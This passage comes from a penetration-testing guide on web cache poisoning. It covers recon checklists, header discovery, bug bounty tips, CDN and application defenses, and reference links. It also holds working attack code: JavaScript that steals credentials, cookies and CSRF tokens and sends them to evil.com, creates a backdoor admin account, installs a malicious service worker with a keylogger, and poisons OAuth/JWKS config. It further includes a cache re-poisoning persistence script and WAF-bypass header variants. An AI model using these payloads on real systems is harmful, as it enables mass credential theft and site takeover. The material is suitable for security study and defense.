        formData.forEach((value, key) => creds[key] = value);
        
        // Exfiltrate credentials
        navigator.sendBeacon('https://evil.com/collect', 
          JSON.stringify(creds));
      });
    }
  });

  // 2. Steal session cookies
  fetch('https://evil.com/steal?cookies=' + 
    encodeURIComponent(document.cookie));

  // 3. Steal CSRF tokens
  const csrfToken = document.querySelector('meta[name="csrf-token"]');
  if (csrfToken) {
    fetch('https://evil.com/steal?csrf=' + csrfToken.content);
  }

  // 4. Inject hidden admin creation form
  fetch('/admin/api/create-user', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken ? csrfToken.content : ''
    },
    body: JSON.stringify({
      username: 'backdoor-admin',
      password: 'P@ssw0rd!',
      role: 'super_admin'
    })
  });
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="PrivEsc Chain"}
  ```text [privesc-chain.txt]
  PRIVILEGE ESCALATION CHAIN:
  ═══════════════════════════
  
  1. RECONNAISSANCE
     └── Identify admin panel URL (/admin, /dashboard, /wp-admin)
     └── Confirm caching is enabled on admin pages
     └── Find unkeyed header (X-Forwarded-Host)
  
  2. CACHE POISONING
     └── Poison admin login page
     └── All admin JS/CSS now loads from evil.com
     └── Cache TTL: 1 hour = 1 hour of credential theft
  
  3. CREDENTIAL THEFT
     └── Admin visits /admin/login
     └── Gets cached page with evil.com JavaScript
     └── Credentials sent to attacker on form submit
  
  4. SESSION HIJACKING
     └── Admin's session cookie exfiltrated
     └── Attacker replays session → instant admin access
  
  5. PERSISTENCE
     └── Injected JS creates backdoor admin account
     └── Even if cache is cleared, backdoor account persists
  
  6. FULL COMPROMISE
     └── Admin access → data exfiltration
     └── Admin access → modify application logic
     └── Admin access → deploy webshell
     └── Admin access → pivot to internal network
  ```
  :::
::

### PrivEsc — JWT/Token Poisoning via Cache

::tabs
  :::tabs-item{icon="i-lucide-code" label="Token Endpoint Poisoning"}
  ```http [jwt-poison.http]
  # Poison the token refresh endpoint
  GET /api/auth/config HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com

  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Poisoned Config Response"}
  ```json [poisoned-auth-config.json]
  {
    "auth_endpoint": "https://evil.com/oauth/token",
    "jwks_uri": "https://evil.com/.well-known/jwks.json",
    "issuer": "https://evil.com",
    "authorization_endpoint": "https://evil.com/oauth/authorize",
    "token_endpoint": "https://evil.com/oauth/token",
    "userinfo_endpoint": "https://evil.com/oauth/userinfo"
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Impact"}
  ```text [jwt-poison-impact.txt]
  IMPACT:
  ═══════
  
  1. Client app reads auth config from /api/auth/config
  2. Gets cached response pointing to evil.com
  3. Client sends OAuth tokens to evil.com instead of target.com
  4. Attacker captures ALL user tokens
  5. If JWKS URI is poisoned → attacker signs their own JWTs
     with their own keys → server accepts them
  6. Attacker creates JWT with: {"role": "admin", "sub": "admin"}
  7. FULL ADMIN ACCESS without ever needing credentials
  ```
  :::
::

### PrivEsc — Service Worker Poisoning

::code-collapse

```javascript [service-worker-poison.js]
/*
 * ATTACK: Poison a page to register a malicious Service Worker
 * 
 * If the poisoned page is served from the root scope (/),
 * the Service Worker gains control over ALL subsequent requests.
 * 
 * This is PERSISTENT — survives cache clearing!
 */

// Step 1: Poison the main page to include this script
// via X-Forwarded-Host → evil.com/sw-installer.js

// Step 2: This script registers a malicious service worker
if ('serviceWorker' in navigator) {
  // The SW script must be hosted on the TARGET domain
  // But we can achieve this via another cache poisoning!
  navigator.serviceWorker.register('/poisoned-sw.js', {
    scope: '/'
  }).then(function(reg) {
    console.log('Malicious SW registered:', reg.scope);
  });
}

// ─── poisoned-sw.js (also served via cache poisoning) ───

self.addEventListener('fetch', function(event) {
  const url = new URL(event.request.url);
  
  // Intercept login form submissions
  if (url.pathname.includes('/login') && event.request.method === 'POST') {
    event.respondWith(
      event.request.clone().text().then(function(body) {
        // Exfiltrate credentials
        fetch('https://evil.com/collect', {
          method: 'POST',
          body: body,
          mode: 'no-cors'
        });
        // Forward the original request so victim doesn't notice
        return fetch(event.request);
      })
    );
    return;
  }
  
  // Inject keylogger into all HTML responses
  if (event.request.headers.get('Accept').includes('text/html')) {
    event.respondWith(
      fetch(event.request).then(function(response) {
        return response.text().then(function(html) {
          const injected = html.replace('</body>', 
            '<script src="https://evil.com/keylogger.js"></script></body>');
          return new Response(injected, {
            headers: response.headers
          });
        });
      })
    );
    return;
  }
  
  event.respondWith(fetch(event.request));
});
```

::

---

## Pentesting Methodology

::steps{level="4"}

#### Reconnaissance — Map the Cache Infrastructure

```text [recon-checklist.txt]
CACHE IDENTIFICATION CHECKLIST:
═══════════════════════════════

Response Headers:
☐ X-Cache: HIT / MISS
☐ CF-Cache-Status (Cloudflare)
☐ X-Varnish / Via: varnish
☐ X-Served-By (Fastly, generic)
☐ X-Amz-Cf-Id / X-Amz-Cf-Pop (CloudFront)
☐ X-Cache-Hits (Varnish)
☐ Age: <seconds>
☐ Akamai-Cache-Status
☐ X-Drupal-Cache
☐ X-Proxy-Cache
☐ X-Rack-Cache
☐ Surrogate-Control

Technology Detection:
☐ Wappalyzer / whatruns.com
☐ CDN detection (CDNplanet, cdnfinder)
☐ DNS analysis (CNAME to CDN?)
☐ SSL certificate analysis
☐ Response timing analysis

Cache Behavior Tests:
☐ Send same request twice → check for HIT
☐ Add unique query param → check for MISS
☐ Check Cache-Control / max-age values
☐ Check Vary header contents
☐ Test which file extensions are cached
☐ Test which paths are cached
☐ Measure cache TTL by watching Age header
```

#### Discovery — Find Unkeyed Inputs

```bash [discovery-commands.sh]
# Use Param Miner in Burp Suite
# Right-click request → Extensions → Param Miner → Guess Headers

# Manual testing with curl
BUSTER="cb=$(date +%s%N)"

# Test X-Forwarded-Host
curl -s "https://target.com/page?$BUSTER" \
  -H "X-Forwarded-Host: canary.evil.com" | grep -i "canary"

# Test X-Forwarded-Scheme
curl -s -D - "https://target.com/page?$BUSTER" \
  -H "X-Forwarded-Scheme: http" | grep -iE "301|302|Location"

# Test X-Original-URL
curl -s "https://target.com/page?$BUSTER" \
  -H "X-Original-URL: /admin" | grep -i "admin"

# Test X-Forwarded-Port
curl -s "https://target.com/page?$BUSTER" \
  -H "X-Forwarded-Port: 1337" | grep "1337"

# Web Cache Vulnerability Scanner
Web-Cache-Vulnerability-Scanner -u "https://target.com/page"
```

#### Validation — Confirm Cache Poisoning

```bash [validation-steps.sh]
#!/bin/bash
# Validate cache poisoning is exploitable

TARGET="https://target.com/page"
HEADER="X-Forwarded-Host"
CANARY="unique-canary-$(date +%s)"

echo "[1] Sending poisoned request..."
BUSTER="validate=$(date +%s%N)"
curl -s "$TARGET?$BUSTER" \
  -H "$HEADER: $CANARY.evil.com" > /dev/null

echo "[2] Waiting 2 seconds for cache to store..."
sleep 2

echo "[3] Fetching page WITHOUT the header..."
RESPONSE=$(curl -s "$TARGET?$BUSTER")

echo "[4] Checking for canary in response..."
if echo "$RESPONSE" | grep -q "$CANARY"; then
  echo "[+] CACHE POISONING CONFIRMED!"
  echo "[+] Canary '$CANARY.evil.com' found in cached response"
  echo "[+] Cache served poisoned content to clean request"
else
  echo "[-] Canary not found — poisoning may not work"
  echo "[-] Try different headers or check cache TTL"
fi

echo "[5] Check cache headers..."
curl -s -D - "$TARGET?$BUSTER" -o /dev/null | grep -iE "x-cache|age:|cf-cache"
```

#### Exploitation — Deliver the Payload

```text [exploitation-guide.txt]
EXPLOITATION SCENARIOS:
═══════════════════════

1. XSS VIA RESOURCE IMPORT (HIGH IMPACT)
   ─────────────────────────────────────
   Unkeyed: X-Forwarded-Host
   Reflected in: <script src="https://ATTACKER/app.js">
   Payload: Host evil.com with malicious JS
   Impact: Stored XSS affecting ALL visitors
   
2. OPEN REDIRECT POISONING (MEDIUM)
   ──────────────────────────────────
   Unkeyed: X-Forwarded-Scheme
   Response: 302 → https://evil.com/phishing
   Impact: Mass phishing via cached redirect
   
3. DENIAL OF SERVICE (HIGH)
   ────────────────────────
   Unkeyed: X-Forwarded-Host
   Reflected in: resource URLs → broken assets
   Impact: Page completely broken for all users
   
4. SEO POISONING (MEDIUM)
   ───────────────────────
   Unkeyed: X-Forwarded-Host
   Reflected in: <link rel="canonical">, og:url
   Impact: Search engines index attacker's domain
   
5. CREDENTIAL THEFT (CRITICAL)
   ────────────────────────────
   Poison login pages with credential-stealing JS
   Impact: All credentials submitted during cache TTL
   
6. SUPPLY CHAIN ATTACK (CRITICAL)
   ───────────────────────────────
   Poison JS bundle URLs → load malicious versions
   Impact: Complete application compromise
```

#### Persistence — Maintain the Poison

```python [cache-keep-alive.py]
import requests
import time
import sys

TARGET = "https://target.com/page"
EVIL_HOST = "evil.com"
HEADER = "X-Forwarded-Host"
CACHE_TTL = 3600  # 1 hour — adjust based on observed TTL
REFRESH_INTERVAL = CACHE_TTL - 60  # Re-poison 60s before expiry

def poison_cache():
    """Send the poison request"""
    headers = {HEADER: EVIL_HOST}
    try:
        resp = requests.get(TARGET, headers=headers, timeout=10)
        cache_status = resp.headers.get('X-Cache', 'unknown')
        age = resp.headers.get('Age', '0')
        print(f"[{time.strftime('%H:%M:%S')}] "
              f"Poison sent | Status: {resp.status_code} | "
              f"Cache: {cache_status} | Age: {age}")
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def verify_poison():
    """Verify the cache is still poisoned"""
    try:
        resp = requests.get(TARGET, timeout=10)
        if EVIL_HOST in resp.text:
            print(f"[✓] Cache still poisoned")
            return True
        else:
            print(f"[✗] Cache no longer poisoned — re-poisoning...")
            return False
    except:
        return False

print(f"[*] Cache Poisoning Persistence")
print(f"[*] Target: {TARGET}")
print(f"[*] Evil Host: {EVIL_HOST}")
print(f"[*] TTL: {CACHE_TTL}s | Refresh: {REFRESH_INTERVAL}s")

# Initial poison
poison_cache()

while True:
    time.sleep(REFRESH_INTERVAL)
    if not verify_poison():
        poison_cache()
    else:
        # Re-poison anyway to reset TTL
        poison_cache()
```

#### Reporting — Document the Finding

```text [report-template.txt]
VULNERABILITY: Web Cache Poisoning — XSS via X-Forwarded-Host
SEVERITY: Critical (CVSS 9.1)
AFFECTED: https://target.com/* (all cached pages)
CACHE PROVIDER: Cloudflare / Varnish / Custom

DESCRIPTION:
The application reflects the X-Forwarded-Host header value into
<script src=""> tags without sanitization. This header is not
included in the cache key, allowing an attacker to poison the
cache with a response that loads JavaScript from an attacker-
controlled domain. All subsequent visitors receive the poisoned
response until cache TTL expires.

REPRODUCTION STEPS:
1. Open Burp Suite and navigate to target.com
2. Send GET / HTTP/1.1 to Repeater
3. Add header: X-Forwarded-Host: [your-burp-collaborator]
4. Add cachebuster: ?cb=unique123
5. Send the request
6. Remove the X-Forwarded-Host header
7. Send the request again (same cachebuster)
8. Observe: response contains collaborator domain in <script> tags
9. Collaborator receives JavaScript requests from victim browsers

CACHE DETAILS:
- Cache-Control: public, max-age=86400 (24 hours)
- X-Cache: HIT (confirmed caching)
- Vary: Accept-Encoding (User-Agent NOT in Vary)
- Cache key: scheme + host + path + query string
- Unkeyed: X-Forwarded-Host, X-Forwarded-Scheme

IMPACT:
- Stored XSS affecting ALL visitors (estimated 500K/day)
- Session hijacking at scale
- Credential theft via injected keyloggers
- Supply chain attack via poisoned JavaScript
- Potential for Service Worker persistence

REMEDIATION:
1. Remove X-Forwarded-Host header processing or validate strictly
2. Add X-Forwarded-Host to cache key (Vary header)
3. Implement strict allowlist for forwarded host values
4. Use relative URLs instead of absolute URLs in HTML
5. Add Subresource Integrity (SRI) to script/link tags
6. Configure CDN to strip unrecognized headers
```

::

---

## Pentest Notes & Tips

::accordion
  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Cache Buster Techniques
  ---
  Always use **cache busters** during testing to avoid poisoning production caches and to get clean MISS responses.

  ```text [cache-buster-techniques.txt]
  QUERY PARAMETER BUSTERS:
  ────────────────────────
  /page?cb=12345
  /page?cachebuster=unique123
  /page?_=1719500000
  /page?test=random-string
  
  PATH-BASED BUSTERS (if query is excluded from key):
  ────────────────────────────────────────────────────
  /page/..%2f?bust=123
  /page%20?bust=123
  /page;bust=123
  
  HEADER-BASED BUSTERS:
  ─────────────────────
  Accept: application/json, text/html;bust=123
  Accept-Language: en-US,en;bust=123
  Origin: https://bust-123.com
  
  IMPORTANT RULES:
  ────────────────
  ✓ Use unique busters for each test
  ✓ Verify the buster creates a cache MISS
  ✓ Never test without busters on production
  ✓ Some CDNs ignore certain query params (utm_*, fbclid)
  ✓ Test if the buster itself is excluded from the key!
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: CDN-Specific Bypass Techniques
  ---
  Each CDN has unique behaviors that can be exploited.

  | CDN | Bypass Technique |
  |-----|-----------------|
  | **Cloudflare** | `__cf_chl_rt_tk` param excluded from key; test `CF-Connecting-IP` |
  | **Akamai** | Cache-key modifications via `Pragma: akamai-x-cache-on`; edge debug headers |
  | **Fastly** | `Fastly-Debug: 1` header reveals cache info; VCL misconfiguration |
  | **CloudFront** | Forwarded headers configurable; test `X-Amz-*` headers |
  | **Varnish** | `X-Varnish` header; restart/purge endpoints; ESI support |
  | **Nginx** | `proxy_cache_key` misconfig; `X-Accel-*` internal headers |
  | **Squid** | Relaxed key generation; `X-Forwarded-For` often unkeyed |
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Timing and TTL Considerations
  ---
  ```text [ttl-considerations.txt]
  CACHE TTL ANALYSIS:
  ═══════════════════
  
  Finding the TTL:
  1. Request the page → note the Age header
  2. Wait and request again → Age should increase
  3. When Age resets to 0 → TTL has expired
  4. TTL = max-age value in Cache-Control header
  
  Exploitation Window:
  - Short TTL (60s): Must continuously re-poison
  - Medium TTL (3600s): Re-poison every ~50 minutes
  - Long TTL (86400s): Single poison lasts 24 hours!
  
  Cache Warming:
  - Some pages aren't cached until first request
  - Send a clean request first → wait for MISS → then poison
  - Some CDNs require multiple requests before caching
  
  Geographic Considerations:
  - CDNs have multiple edge servers worldwide
  - Poisoning one edge ≠ poisoning all edges
  - Must poison each PoP (Point of Presence)
  - Or target the origin/shield cache layer
  
  Shield/Origin Caching:
  - Some CDNs have a "shield" layer between edges and origin
  - Poisoning the shield poisons ALL edges
  - Look for: X-Served-By, X-Cache-Hits patterns
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Common Frameworks & Their Unkeyed Inputs
  ---
  | Framework | Common Unkeyed Input | Reflected In |
  |-----------|---------------------|-------------|
  | **Django** | `X-Forwarded-Host` | `request.get_host()` → URLs |
  | **Rails** | `X-Forwarded-Host` | `request.host` → asset URLs |
  | **Laravel** | `X-Forwarded-Host`, `X-Forwarded-Proto` | `url()`, `asset()` helpers |
  | **Spring Boot** | `X-Forwarded-Host`, `X-Forwarded-Port` | `ForwardedHeaderFilter` |
  | **Express** | `X-Forwarded-Host` (if `trust proxy`) | `req.hostname` |
  | **WordPress** | `X-Forwarded-Host` | `home_url()`, `site_url()` |
  | **Drupal** | `X-Forwarded-Host` | Base URL generation |
  | **Next.js** | `X-Forwarded-Host` | `getServerSideProps` URLs |
  | **Flask** | `X-Forwarded-Host`, `X-Forwarded-Proto` | `url_for()` |
  | **ASP.NET** | `X-Original-URL`, `X-Rewrite-URL` | URL routing |
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: WAF Bypass for Cache Poisoning
  ---
  ```text [waf-bypass-techniques.txt]
  WAF BYPASS TECHNIQUES FOR CACHE POISONING:
  ═══════════════════════════════════════════
  
  1. HEADER CASE MANIPULATION
     X-Forwarded-Host → x-forwarded-host → X-FORWARDED-HOST
     Some WAFs are case-sensitive, backends are not
  
  2. HEADER VALUE ENCODING
     X-Forwarded-Host: evil.com
     X-Forwarded-Host: evil%2ecom
     X-Forwarded-Host: evil。com (fullwidth dot)
  
  3. DUPLICATE HEADERS
     X-Forwarded-Host: legitimate.com
     X-Forwarded-Host: evil.com
     WAF checks first, backend uses last (or vice versa)
  
  4. HEADER INJECTION VIA LINE FOLDING
     X-Forwarded-Host: legit.com
      evil.com
     (space/tab continuation — deprecated but sometimes works)
  
  5. ALTERNATIVE HEADERS
     If X-Forwarded-Host is blocked, try:
     - Forwarded: host=evil.com
     - X-Host: evil.com  
     - X-Forwarded-Server: evil.com
     - X-HTTP-Host-Override: evil.com
     - X-Original-Host: evil.com
  
  6. PARAMETER POLLUTION
     ?param=clean&param=<script>alert(1)</script>
     WAF validates first value, app uses last
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Detecting Cache Poisoning in Bug Bounties
  ---
  ```text [bug-bounty-tips.txt]
  BUG BOUNTY TIPS FOR CACHE POISONING:
  ════════════════════════════════════
  
  DO:
  ✓ Always use unique cache busters
  ✓ Test on staging/non-production paths first
  ✓ Report with clear PoC using Burp Collaborator
  ✓ Calculate business impact (users affected × TTL)
  ✓ Show the full attack chain (poison → XSS → data theft)
  ✓ Mention the CDN/cache provider in your report
  ✓ Test multiple pages — some may be cached differently
  
  DON'T:
  ✗ Never poison production caches without cache busters
  ✗ Never demonstrate on login/checkout pages in production
  ✗ Don't assume cache key composition — test it
  ✗ Don't forget to check mobile vs desktop cache variants
  
  HIGH-VALUE TARGETS:
  ├── Login pages (credential theft)
  ├── Password reset pages (token theft)
  ├── OAuth callback pages (code/token theft)
  ├── Payment/checkout pages (card theft)
  ├── API documentation pages (developer targeting)
  ├── CDN-hosted JavaScript bundles
  └── Single-page application entry points (index.html)
  
  SEVERITY ESCALATION:
  ├── Reflected in HTML body → XSS → Critical
  ├── Reflected in redirect → Open Redirect → High
  ├── Reflected in resource URLs → Supply Chain → Critical
  ├── Causes broken resources → DoS → Medium-High
  └── Reflected in meta tags only → SEO Poison → Low-Medium
  ```
  :::
::

---

## Automation & Tools

::card-group
  ::card
  ---
  title: Param Miner
  icon: i-simple-icons-portswigger
  to: https://github.com/PortSwigger/param-miner
  target: _blank
  ---
  Burp Suite extension by James Kettle. Automatically discovers unkeyed headers, cookies, and query parameters. Essential for cache poisoning recon.
  ::

  ::card
  ---
  title: Web-Cache-Vulnerability-Scanner
  icon: i-simple-icons-github
  to: https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
  target: _blank
  ---
  Automated scanner by Hackmanit that tests for various web cache poisoning and deception vulnerabilities with detailed reporting.
  ::

  ::card
  ---
  title: CacheKiller (Burp Extension)
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/bappstore/37f57d3b1ec1491184d8a9aa49e5a8b2
  target: _blank
  ---
  Automatically adds cache-busting parameters to every request in Burp Suite, ensuring you never accidentally poison a production cache.
  ::

  ::card
  ---
  title: wcpf — Web Cache Poisoning Fuzzer
  icon: i-simple-icons-github
  to: https://github.com/AetherBlack/wcpf
  target: _blank
  ---
  Focused fuzzer for web cache poisoning that tests common unkeyed inputs with various payload types.
  ::
::

### Custom Wordlists for Header Fuzzing

::code-collapse

```text [unkeyed-headers-wordlist.txt]
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Forwarded-Port
X-Forwarded-For
X-Forwarded-Server
X-Original-URL
X-Rewrite-URL
X-Host
X-HTTP-Host-Override
X-Original-Host
X-Forwarded-Prefix
X-Amz-Website-Redirect-Location
X-Real-IP
X-Remote-IP
X-Remote-Addr
X-Client-IP
True-Client-IP
CF-Connecting-IP
Fastly-Client-IP
X-Azure-ClientIP
X-Azure-Ref
X-Custom-IP-Authorization
X-Originating-IP
X-ProxyUser-Ip
X-Backend-Host
X-HTTP-Method-Override
X-Method-Override
X-HTTP-Method
X-Original-Method
X-Forwarded-SSL
X-Forwarded-Protocol
X-Url-Scheme
Front-End-Https
X-Wap-Profile
X-Arbitrary
X-ATT-DeviceId
X-UIDH
X-Requested-With
X-CSRF-Token
X-Request-ID
X-Correlation-ID
X-Debug
X-Debug-Mode
X-Served-By
X-Timer
Surrogate-Capability
TE
Transfer-Encoding
Forwarded
Origin
Referer
Accept-Language
Accept
Cookie
If-None-Match
If-Modified-Since
X-Cache-Key
X-Cache-Hash
X-Modified-URL
X-Override-URL
X-Alternative-URL
Request-Uri
X-Proxy-URL
X-Rewrite-Path
X-Envoy-Original-Path
X-Envoy-Decorator-Operation
X-Istio-Attributes
Cluster-Client-IP
X-Appengine-Country
X-Cloud-Trace-Context
```

::

---

## Defense & Remediation

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Application Level"}
  ```text [app-level-defense.txt]
  APPLICATION-LEVEL DEFENSES:
  ═══════════════════════════
  
  1. USE RELATIVE URLs — NOT ABSOLUTE
     ─────────────────────────────────
     BAD:  <script src="https://{{ host }}/app.js">
     GOOD: <script src="/app.js">
  
  2. VALIDATE FORWARDED HEADERS
     ──────────────────────────
     Only accept X-Forwarded-Host from trusted proxies
     Implement strict allowlists for expected values
  
  3. DISABLE UNNECESSARY HEADERS
     ───────────────────────────
     Strip X-Forwarded-Host if not needed
     Disable X-Original-URL / X-Rewrite-URL
  
  4. SUBRESOURCE INTEGRITY (SRI)
     ───────────────────────────
     <script src="/app.js" 
       integrity="sha384-hash..." 
       crossorigin="anonymous">
     Even if URL is poisoned, browser won't execute 
     if hash doesn't match
  
  5. CONTENT SECURITY POLICY (CSP)
     ─────────────────────────────
     Content-Security-Policy: script-src 'self';
     Prevents loading scripts from attacker domains
  ```
  :::

  :::tabs-item{icon="i-lucide-server" label="Cache Level"}
  ```nginx [cache-level-defense.conf]
  # Nginx — Strip dangerous headers before caching
  proxy_set_header X-Forwarded-Host "";
  proxy_set_header X-Original-URL "";
  proxy_set_header X-Rewrite-URL "";
  proxy_set_header X-HTTP-Method-Override "";
  
  # Only cache GET/HEAD requests
  proxy_cache_methods GET HEAD;
  
  # Include important headers in cache key
  proxy_cache_key "$scheme$host$request_uri$http_accept_language";
  
  # Set proper Vary headers
  add_header Vary "Accept-Encoding, Accept-Language";
  
  # Don't cache responses with Set-Cookie
  proxy_no_cache $http_set_cookie;
  proxy_hide_header Set-Cookie;
  
  # Short TTL for dynamic content
  proxy_cache_valid 200 10m;
  proxy_cache_valid 301 302 1m;
  ```
  :::

  :::tabs-item{icon="i-lucide-cloud" label="CDN Configuration"}
  ```text [cdn-defense-config.txt]
  CDN-LEVEL DEFENSES:
  ═══════════════════
  
  CLOUDFLARE:
  ├── Cache Rules: Define explicit cache key composition
  ├── Transform Rules: Strip unrecognized headers
  ├── WAF Custom Rules: Block requests with X-Forwarded-Host
  └── Page Rules: Control caching per path
  
  AKAMAI:
  ├── Modify Incoming Request: Remove unkeyed headers
  ├── Cache Key Modification: Add critical headers to key
  ├── Site Shield: Restrict origin access
  └── Edge Redirector: Validate redirect targets
  
  FASTLY:
  ├── VCL: Remove dangerous headers in vcl_recv
  ├── Custom cache key via hash_data()
  ├── Request collapsing configuration
  └── Shield configuration for origin protection
  
  AWS CLOUDFRONT:
  ├── Cache Policy: Explicitly define key components
  ├── Origin Request Policy: Control forwarded headers
  ├── Response Headers Policy: Add security headers
  └── Lambda@Edge: Custom header validation
  
  GENERAL:
  ✓ Explicitly define cache keys (don't rely on defaults)
  ✓ Strip all X-Forwarded-* headers from client requests
  ✓ Only allow forwarded headers from trusted load balancers
  ✓ Monitor cache hit rates for anomalies
  ✓ Implement cache purge monitoring/alerting
  ```
  :::
::

---

## Real-World Vulnerability Examples

::card-group
  ::card
  ---
  title: "Cloudflare — Cache Poisoning DoS"
  icon: i-simple-icons-cloudflare
  to: https://hackerone.com/reports/409370
  target: _blank
  ---
  Cache poisoning via `X-Forwarded-Port` header caused resource URLs to include unexpected ports, breaking all assets for cached pages across Cloudflare-protected sites.
  ::

  ::card
  ---
  title: "GitLab — XSS via Cache Poisoning"
  icon: i-simple-icons-gitlab
  to: https://hackerone.com/reports/492841
  target: _blank
  ---
  `X-Forwarded-Host` header reflected into page meta tags and asset URLs, enabling stored XSS via cache poisoning affecting all GitLab Pages users.
  ::

  ::card
  ---
  title: "Unity — Cache Poisoning to XSS"
  icon: i-simple-icons-unity
  to: https://hackerone.com/reports/649189
  target: _blank
  ---
  Cache poisoning through multiple unkeyed headers on Unity's documentation site, leading to JavaScript injection via poisoned script source URLs.
  ::

  ::card
  ---
  title: "Shopify — Cache Poisoning via X-Forwarded-Host"
  icon: i-simple-icons-shopify
  to: https://hackerone.com/reports/1888720
  target: _blank
  ---
  Multiple Shopify storefront endpoints vulnerable to cache poisoning via `X-Forwarded-Host`, allowing attackers to inject malicious resource URLs affecting all store visitors.
  ::

  ::card
  ---
  title: "DoD — Cache Poisoning on Defense Sites"
  icon: i-lucide-shield
  to: https://hackerone.com/reports/491982
  target: _blank
  ---
  US Department of Defense websites vulnerable to cache poisoning via unkeyed headers, potentially serving malicious content to government employees.
  ::

  ::card
  ---
  title: "Automattic — WordPress.com Cache Deception"
  icon: i-simple-icons-wordpress
  to: https://hackerone.com/reports/593712
  target: _blank
  ---
  Web cache deception on WordPress.com allowed attackers to cache and access victims' authenticated dashboard responses containing private data.
  ::
::

---

## References & Learning Resources

::card-group
  ::card
  ---
  title: "Practical Web Cache Poisoning (James Kettle)"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/research/practical-web-cache-poisoning
  target: _blank
  ---
  The original 2018 research paper by James Kettle that defined modern web cache poisoning techniques. Essential reading.
  ::

  ::card
  ---
  title: "Web Cache Entanglement (James Kettle)"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/research/web-cache-entanglement
  target: _blank
  ---
  Advanced 2020 research covering cache key normalization exploits, fat GET attacks, and parameter cloaking techniques.
  ::

  ::card
  ---
  title: "Responsible Denial of Service with Cache Poisoning"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning
  target: _blank
  ---
  Research on using cache poisoning for denial of service by breaking resource URLs — a highly impactful but often overlooked attack variant.
  ::

  ::card
  ---
  title: "PortSwigger Academy — Cache Poisoning Labs"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/web-security/web-cache-poisoning
  target: _blank
  ---
  Free interactive labs covering basic cache poisoning, multi-header exploits, parameter cloaking, internal cache poisoning, and cache deception.
  ::

  ::card
  ---
  title: "Gotta Cache 'Em All — Bending the Rules (Hackmanit)"
  icon: i-lucide-file-text
  to: https://www.hackmanit.de/en/blog-en/142-web-cache-poisoning
  target: _blank
  ---
  Research by Hackmanit exploring cache poisoning across 20+ CDN and cache providers with systematic testing methodology.
  ::

  ::card
  ---
  title: "OWASP — Cache Poisoning"
  icon: i-simple-icons-owasp
  to: https://owasp.org/www-community/attacks/Cache_Poisoning
  target: _blank
  ---
  OWASP community documentation covering cache poisoning fundamentals, attack vectors, and defensive coding practices.
  ::

  ::card
  ---
  title: "HackTricks — Cache Poisoning & Deception"
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/cache-deception/cache-poisoning-and-cache-deception.html
  target: _blank
  ---
  Community-maintained reference with practical exploitation examples, tool usage, and real-world case studies for both cache poisoning and deception.
  ::

  ::card
  ---
  title: "Web Cache Deception Attack (Omer Gil)"
  icon: i-lucide-file-text
  to: https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html
  target: _blank
  ---
  The original 2017 research paper introducing web cache deception — the complementary attack to cache poisoning.
  ::

  ::card
  ---
  title: "CWE-444: HTTP Request/Response Smuggling"
  icon: i-lucide-shield-alert
  to: https://cwe.mitre.org/data/definitions/444.html
  target: _blank
  ---
  MITRE CWE entry covering HTTP inconsistency vulnerabilities that enable cache poisoning through request smuggling.
  ::

  ::card
  ---
  title: "YouSec — Cache Poisoning Cheat Sheet"
  icon: i-simple-icons-github
  to: https://github.com/yousefselim1/Cache-Poisoning-Cheat-Sheet
  target: _blank
  ---
  Community cheat sheet with header lists, payload templates, and testing workflows for web cache poisoning assessments.
  ::

  ::card
  ---
  title: "Cloudflare — How Caching Works"
  icon: i-simple-icons-cloudflare
  to: https://developers.cloudflare.com/cache/concepts/default-cache-behavior/
  target: _blank
  ---
  Official Cloudflare documentation explaining default cache behavior, cache keys, and configuration — essential for testing Cloudflare-protected targets.
  ::
::